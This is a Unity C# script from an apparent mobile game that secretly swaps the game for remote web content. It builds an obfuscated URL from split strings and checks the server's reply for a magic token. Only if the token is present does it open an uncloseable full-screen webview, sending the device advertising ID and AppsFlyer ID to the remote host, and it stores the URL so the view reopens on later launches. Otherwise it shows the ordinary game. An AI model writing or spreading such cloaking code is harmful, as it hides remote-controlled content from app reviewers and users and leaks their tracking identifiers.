using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainPOC : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string onePOCnazv = "";
    [HideInInspector] public string twoPOCnazv = "";

    private IEnumerator IENUMENATORPOC()
    {
        using (UnityWebRequest poc = UnityWebRequest.Get(twoPOCnazv))
        {

            yield return poc.SendWebRequest();
            if (poc.isNetworkError)
            {
                MovePOC();
            }
            int schemePOC = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && schemePOC > 0)
            {
                yield return new WaitForSeconds(1);
                schemePOC--;
            }
            try
            {
                if (poc.result == UnityWebRequest.Result.Success)
                {
                    if (poc.downloadHandler.text.Contains("PrmdfChlljkXoEQS"))
                    {

                        try
                        {
                            var subs = poc.downloadHandler.text.Split('|');
                            GRIDPOCSEE(subs[0] + "?idfa=" + onePOCnazv, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            GRIDPOCSEE(poc.downloadHandler.text + "?idfa=" + onePOCnazv + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        MovePOC();
                    }
                }
                else
                {
                    MovePOC();
                }
            }
            catch
            {
                MovePOC();
            }
        }
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("AdresPOCquote", string.Empty) != string.Empty)
            {
                GRIDPOCSEE(PlayerPrefs.GetString("AdresPOCquote"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoPOCnazv += n;
                }
                StartCoroutine(IENUMENATORPOC());
            }
        }
        else
        {
            MovePOC();
        }
    }

    private void GRIDPOCSEE(string AdresPOCquote, string NamingPOC = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _connectsPOC = gameObject.AddComponent<UniWebView>();
        _connectsPOC.SetToolbarDoneButtonText("");
        switch (NamingPOC)
        {
            case "0":
                _connectsPOC.SetShowToolbar(true, false, false, true);
                break;
            default:
                _connectsPOC.SetShowToolbar(false);
                break;
        }
        _connectsPOC.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _connectsPOC.OnShouldClose += (view) =>
        {
            return false;
        };
        _connectsPOC.SetSupportMultipleWindows(true);
        _connectsPOC.SetAllowBackForwardNavigationGestures(true);
        _connectsPOC.OnMultipleWindowOpened += (view, windowId) =>
        {
            _connectsPOC.SetShowToolbar(true);

        };
        _connectsPOC.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingPOC)
            {
                case "0":
                    _connectsPOC.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _connectsPOC.SetShowToolbar(false);
                    break;
            }
        };
        _connectsPOC.OnOrientationChanged += (view, orientation) =>
        {
            _connectsPOC.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _connectsPOC.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("AdresPOCquote", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("AdresPOCquote", url);
            }
        };
        _connectsPOC.Load(AdresPOCquote);
        _connectsPOC.Show();
    }

    

    

    private void MovePOC()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("EnterScreen");
    }

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaPOC") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { onePOCnazv = advertisingId; });
        }
    }


}
